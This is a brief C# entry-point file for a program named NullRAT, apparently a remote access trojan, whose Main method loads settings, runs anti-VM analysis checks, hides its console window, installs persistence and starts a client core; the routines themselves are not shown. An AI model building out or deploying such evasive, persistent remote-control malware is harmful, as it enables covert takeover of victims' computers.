using NullRAT.Config;
using NullRAT.Core;
using NullRAT.Utils;

namespace NullRAT
{
    internal class Program
    {
        static void Main()
        {
            Config.Load();

            if (Config.AntiVM)
                AntiAnalysis.RunChecks();

            if (Config.StartHidden)
                Helper.HideConsole();

            if (Config.AutoPersist)
                Persistence.Install();

            ClientCore.Start();
        }
    }
}